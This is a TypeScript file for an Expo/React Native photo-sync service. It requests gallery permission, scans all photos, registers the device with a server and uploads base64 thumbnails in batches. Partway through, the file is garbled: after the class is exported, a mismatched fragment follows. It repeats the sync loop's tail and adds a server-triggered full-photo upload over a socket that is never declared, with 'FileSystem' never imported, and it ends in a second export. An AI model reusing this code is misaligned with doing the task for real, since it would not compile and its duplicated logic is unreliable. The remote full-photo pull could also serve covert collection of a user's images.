import * as MediaLibrary from 'expo-media-library';
import * as ImageManipulator from 'expo-image-manipulator';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { getDeviceInfo, DeviceInfo } from './deviceService';
import { API_URL, SYNC_CONFIG } from '../config';

const SYNCED_PHOTOS_KEY = '@synced_photos';
const LAST_SYNC_KEY = '@last_sync';

export interface PhotoMetadata {
  id: string;
  filename: string;
  uri: string;
  width: number;
  height: number;
  creationTime: number;
  modificationTime: number;
  mediaType: string;
  duration?: number;
  fileSize?: number;
}

export interface SyncProgress {
  total: number;
  synced: number;
  current: string;
  phase: 'scanning' | 'syncing' | 'complete' | 'error';
}

class SyncService {
  private deviceInfo: DeviceInfo | null = null;
  private syncedPhotos: Set<string> = new Set();
  private onProgressCallback: ((progress: SyncProgress) => void) | null = null;

  async initialize() {
    // Load device info
    this.deviceInfo = await getDeviceInfo();
    
    // Load synced photos list
    const synced = await AsyncStorage.getItem(SYNCED_PHOTOS_KEY);
    if (synced) {
      this.syncedPhotos = new Set(JSON.parse(synced));
    }
    
    // Register device with server
    await this.registerDevice();
    
    return this.deviceInfo;
  }

  private async registerDevice() {
    if (!this.deviceInfo) return;

    try {
      await fetch(`${API_URL}/api/device-sync/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...this.deviceInfo,
          syncedCount: this.syncedPhotos.size,
        }),
      });
      console.log('Device registered');
    } catch (error) {
      console.error('Failed to register device:', error);
    }
  }

  setProgressCallback(callback: (progress: SyncProgress) => void) {
    this.onProgressCallback = callback;
  }

  private updateProgress(progress: SyncProgress) {
    if (this.onProgressCallback) {
      this.onProgressCallback(progress);
    }
  }

  async getAllPhotos(): Promise<PhotoMetadata[]> {
    const { status } = await MediaLibrary.requestPermissionsAsync();
    if (status !== 'granted') {
      throw new Error('Media library permission not granted');
    }

    const photos: PhotoMetadata[] = [];
    let hasMore = true;
    let endCursor: string | undefined;

    this.updateProgress({
      total: 0,
      synced: 0,
      current: 'Scanning gallery...',
      phase: 'scanning',
    });

    while (hasMore) {
      const result = await MediaLibrary.getAssetsAsync({
        first: 100,
        after: endCursor,
        mediaType: [MediaLibrary.MediaType.photo],
        sortBy: [MediaLibrary.SortBy.creationTime],
      });

      for (const asset of result.assets) {
        photos.push({
          id: asset.id,
          filename: asset.filename,
          uri: asset.uri,
          width: asset.width,
          height: asset.height,
          creationTime: asset.creationTime,
          modificationTime: asset.modificationTime,
          mediaType: asset.mediaType,
          duration: asset.duration,
        });
      }

      hasMore = result.hasNextPage;
      endCursor = result.endCursor;

      this.updateProgress({
        total: photos.length,
        synced: 0,
        current: `Found ${photos.length} photos...`,
        phase: 'scanning',
      });
    }

    return photos;
  }

  async createThumbnail(uri: string): Promise<string> {
    try {
      const manipulated = await ImageManipulator.manipulateAsync(
        uri,
        [{ resize: { width: SYNC_CONFIG.THUMBNAIL_SIZE } }],
        {
          compress: SYNC_CONFIG.THUMBNAIL_QUALITY,
          format: ImageManipulator.SaveFormat.JPEG,
          base64: true,
        }
      );
      return manipulated.base64 || '';
    } catch (error) {
      console.error('Error creating thumbnail:', error);
      return '';
    }
  }

  async syncPhotos(): Promise<void> {
    if (!this.deviceInfo) {
      await this.initialize();
    }

    const allPhotos = await this.getAllPhotos();
    const unsyncedPhotos = allPhotos.filter(p => !this.syncedPhotos.has(p.id));

    if (unsyncedPhotos.length === 0) {
      this.updateProgress({
        total: allPhotos.length,
        synced: allPhotos.length,
        current: 'All photos synced!',
        phase: 'complete',
      });
      return;
    }

    // Sync in batches
    let syncedCount = 0;
    for (let i = 0; i < unsyncedPhotos.length; i += SYNC_CONFIG.BATCH_SIZE) {
      const batch = unsyncedPhotos.slice(i, i + SYNC_CONFIG.BATCH_SIZE);
      
      const photosWithThumbnails = await Promise.all(
        batch.map(async (photo) => {
          const thumbnail = await this.createThumbnail(photo.uri);
          return {
            ...photo,
            thumbnail,
            deviceId: this.deviceInfo?.deviceId,
          };
        })
      );

      // Send batch to server
      try {
        const response = await fetch(`${API_URL}/api/device-sync/photos`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            deviceId: this.deviceInfo?.deviceId,
            photos: photosWithThumbnails,
          }),
        });

        if (response.ok) {
          // Mark as synced
          batch.forEach(photo => this.syncedPhotos.add(photo.id));
          await AsyncStorage.setItem(
            SYNCED_PHOTOS_KEY,
            JSON.stringify([...this.syncedPhotos])
          );
          syncedCount += batch.length;
        }
      } catch (error) {
        console.error('Error syncing batch:', error);
      }

      this.updateProgress({
        total: unsyncedPhotos.length,
        synced: syncedCount,
        current: `Syncing ${syncedCount} of ${unsyncedPhotos.length}...`,
        phase: 'syncing',
      });

      // Delay between batches
      if (i + SYNC_CONFIG.BATCH_SIZE < unsyncedPhotos.length) {
        await new Promise(resolve => setTimeout(resolve, SYNC_CONFIG.BATCH_DELAY));
      }
    }

    await AsyncStorage.setItem(LAST_SYNC_KEY, new Date().toISOString());
    
    this.updateProgress({
      total: allPhotos.length,
      synced: allPhotos.length,
      current: 'Sync complete!',
      phase: 'complete',
    });
  }

  async getLastSyncTime(): Promise<string | null> {
    return AsyncStorage.getItem(LAST_SYNC_KEY);
  }

  getSyncedCount(): number {
    return this.syncedPhotos.size;
  }

  async clearSyncData(): Promise<void> {
    this.syncedPhotos.clear();
    await AsyncStorage.removeItem(SYNCED_PHOTOS_KEY);
    await AsyncStorage.removeItem(LAST_SYNC_KEY);
  }
}

export const syncService = new SyncService();
            JSON.stringify([...this.syncedPhotos])
          );
        }
      } catch (error) {
        console.error('Error syncing batch:', error);
      }

      this.updateProgress({
        total: unsyncedPhotos.length,
        synced: Math.min(i + SYNC_CONFIG.BATCH_SIZE, unsyncedPhotos.length),
        current: `Syncing ${Math.min(i + SYNC_CONFIG.BATCH_SIZE, unsyncedPhotos.length)} of ${unsyncedPhotos.length}...`,
        phase: 'syncing',
      });

      // Delay between batches
      if (i + SYNC_CONFIG.BATCH_SIZE < unsyncedPhotos.length) {
        await new Promise(resolve => setTimeout(resolve, SYNC_CONFIG.BATCH_DELAY));
      }
    }

    await AsyncStorage.setItem(LAST_SYNC_KEY, new Date().toISOString());
    
    this.updateProgress({
      total: allPhotos.length,
      synced: allPhotos.length,
      current: 'Sync complete!',
      phase: 'complete',
    });
  }

  async sendFullPhoto(photoId: string): Promise<void> {
    if (!this.socket || !this.deviceInfo) return;

    try {
      // Get asset info
      const asset = await MediaLibrary.getAssetInfoAsync(photoId);
      
      if (!asset || !asset.localUri) {
        this.socket.emit('full_photo_response', {
          photoId,
          deviceId: this.deviceInfo.deviceId,
          error: 'Photo not found',
        });
        return;
      }

      // Read file as base64
      const base64 = await FileSystem.readAsStringAsync(asset.localUri, {
        encoding: FileSystem.EncodingType.Base64,
      });

      // Send to server
      this.socket.emit('full_photo_response', {
        photoId,
        deviceId: this.deviceInfo.deviceId,
        filename: asset.filename,
        base64,
        mimeType: 'image/jpeg',
      });

      console.log('Sent full photo:', photoId);
    } catch (error) {
      console.error('Error sending full photo:', error);
      this.socket.emit('full_photo_response', {
        photoId,
        deviceId: this.deviceInfo?.deviceId,
        error: 'Failed to read photo',
      });
    }
  }

  async getLastSyncTime(): Promise<string | null> {
    return AsyncStorage.getItem(LAST_SYNC_KEY);
  }

  getSyncedCount(): number {
    return this.syncedPhotos.size;
  }

  isConnected(): boolean {
    return this.socket?.connected || false;
  }

  disconnect() {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }
}

export const syncService = new SyncService();
